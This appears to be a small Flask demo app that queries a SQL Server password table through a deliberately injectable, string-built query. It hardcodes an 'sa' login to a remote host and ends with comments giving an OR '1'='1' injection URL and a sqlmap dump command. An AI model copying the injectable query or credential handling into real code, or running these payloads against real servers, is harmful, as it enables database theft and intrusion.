from flask import Flask, request
import pymssql

app = Flask(__name__)

# Parameter connection with SQL
sql_server_conexion = pymssql.connect(
    server='ec2-44-211-166-82.compute-1.amazonaws.com',
    database='AdventureWorks2016',
    user='sa',
    password='SqlServer2024**'
)

def Connection(ID, password):
    try:
        #Open the connection
        cursor_sql_server = sql_server_conexion.cursor()
        print("Open the connection")
        cursor_sql_server.execute(f"SELECT * FROM Person.Password WHERE BusinessEntityID = {ID} AND PasswordSalt = {password}")
        resultado_sql_server = cursor_sql_server.fetchall()
        return resultado_sql_server

    finally:
        # Close the connection
        print("Closing the connection")
        #sql_server_conexion.close()

@app.route('/saludo')
def saludar():
    id = request.args.get('id')
    password = request.args.get('password')
    resultado = Connection(id, password)
    return f'{resultado}!'

if __name__ == '__main__':
    app.run(debug=True)

#http://localhost:5000/saludo?id=%271%27&password=%27bE3XiWw=%27
#http://localhost:5000/saludo?id=%27%27%20OR%20%271%27=%271%27;--&password=%27bE3XiWw=%27
#sqlmap -u "http://localhost:5000/saludo?id='' OR '1'='1';--&password='bE3XiWw='" -D AdventuraWorks2016 --dump --fresh-queries

